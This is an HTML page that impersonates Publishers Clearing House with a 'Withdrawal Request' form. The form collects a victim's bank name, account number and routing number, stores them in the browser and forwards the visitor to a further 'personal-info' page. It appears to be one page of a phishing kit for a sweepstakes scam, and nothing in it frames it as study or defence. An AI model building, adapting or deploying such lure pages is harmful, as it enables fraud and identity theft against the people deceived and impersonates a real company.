<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Publishers Clearing House - Withdrawal Request</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #f5f5f5;
      font-family: 'Arial', sans-serif;
      color: #4a4a4a;
    }
    .container {
      max-width: 500px;
      margin-top: 40px;
    }
    .pch-logo {
      max-width: 200px;
      margin-bottom: 20px;
    }
    .card {
      border: none;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      background-color: #ffffff;
    }
    .card-header {
      background-color: #f28c38;
      color: #ffffff;
      text-align: center;
      padding: 15px;
      border-top-left-radius: 10px;
      border-top-right-radius: 10px;
      font-size: 1.5rem;
      font-weight: bold;
    }
    .form-label {
      color: #666666;
      font-weight: 500;
    }
    .form-control {
      border-color: #cccccc;
      border-radius: 5px;
    }
    .form-control:focus {
      border-color: #f28c38;
      box-shadow: 0 0 5px rgba(242, 140, 56, 0.5);
    }
    .btn-primary {
      background-color: #f28c38;
      border: none;
      padding: 10px;
      font-weight: 600;
    }
    .btn-primary:hover {
      background-color: #e0701d;
    }
    .required::after {
      content: " *";
      color: #dc3545;
    }
  </style>
</head>
<body>
  <div class="container text-center">
    <img src="images/pch-logo.png" alt="PCH Logo" class="img-fluid pch-logo">
    <div class="card mx-auto">
      <div class="card-header">Withdrawal Request</div>
      <div class="card-body">
        <form id="withdrawForm">
          <div class="mb-3 text-start">
            <label for="bankName" class="form-label required">Bank Name</label>
            <input type="text" class="form-control" id="bankName" required>
          </div>
          <div class="mb-3 text-start">
            <label for="accountNumber" class="form-label required">Account Number</label>
            <input type="text" class="form-control" id="accountNumber" required>
          </div>
          <div class="mb-3 text-start">
            <label for="routingNumber" class="form-label required">Routing Number</label>
            <input type="text" class="form-control" id="routingNumber" required>
          </div>
          <button type="submit" class="btn btn-primary w-100">Submit</button>
        </form>
      </div>
    </div>
  </div>
  <script>
    document.getElementById('withdrawForm').addEventListener('submit', (e) => {
      e.preventDefault();
      const bankDetails = {
        bankName: document.getElementById('bankName').value,
        accountNumber: document.getElementById('accountNumber').value,
        routingNumber: document.getElementById('routingNumber').value
      };
      localStorage.setItem('bankDetails', JSON.stringify(bankDetails));
      window.location.href = 'personal-info.html';
    });
  </script>
</body>
</html>
